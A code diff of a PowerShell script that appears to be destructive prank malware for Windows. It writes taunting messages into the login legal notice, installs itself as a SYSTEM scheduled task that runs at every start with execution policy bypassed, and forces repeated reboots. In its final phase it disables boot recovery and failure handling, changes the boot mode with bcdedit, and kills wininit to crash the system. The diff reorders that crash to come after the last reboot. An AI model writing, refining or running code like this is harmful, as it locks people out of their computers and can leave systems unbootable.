@@ -20,13 +20,13 @@ $systemRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Syste
 
 if ($restartCount -eq 0) {
     New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh? Trying to log in?" -PropertyType String -Force
-    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Ah~ Sweetheart, you're locked out <3 Try again later~ ;)" -PropertyType String -Force
+    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Ah~ Sweetheart, you are locked out <3 Try again later~ ;)" -PropertyType String -Force
     $restartCount = 1
 }
 
 elseif ($restartCount -eq 1) {
-    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Persistent, aren't we?" -PropertyType String -Force
-    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Round two, darling~? You’ll have to wait longer this time~ ;)" -PropertyType String -Force
+    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Persistent, right~?" -PropertyType String -Force
+    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Round two, darling~? You will have to wait longer this time~ ;)" -PropertyType String -Force
     $restartCount = 2
 }
 
@@ -34,13 +34,14 @@ elseif ($restartCount -eq 2) {
     New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh dear~ You really tried..." -PropertyType String -Force
     New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Too bad, love~ No more chances <3 See you never~!" -PropertyType String -Force
 
-    # **Final Phase: Break Windows Boot**
+    # **Final Phase: Modify Boot for Network Boot**
+    bcdedit /set {default} bootmenupolicy legacy
     bcdedit /set {current} bootstatuspolicy ignoreallfailures
     bcdedit /set {current} recoveryenabled no
-    bcdedit /set {default} bootmenupolicy legacy
+    bcdedit /set {current} safeboot network
 
-    # **Force BSOD**
-    Stop-Process -Name "wininit" -Force
+    # **Save the final restart count**
+    $restartCount = 3
 }
 
 # Save Restart Count
@@ -54,5 +55,11 @@ Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force
 
 schtasks /create /tn $taskName /tr "powershell -ExecutionPolicy Bypass -File $scriptPath" /sc onstart /ru SYSTEM /f
 
-# Force Restart (No GUI)
-shutdown /r /f /t 5
+# Restart Logic
+if ($restartCount -lt 3) {
+    shutdown /r /f /t 5
+} else {
+    # **Final Phase: Crash Windows AFTER the final reboot happens**
+    Start-Sleep -Seconds 10
+    Stop-Process -Name "wininit" -Force
+}
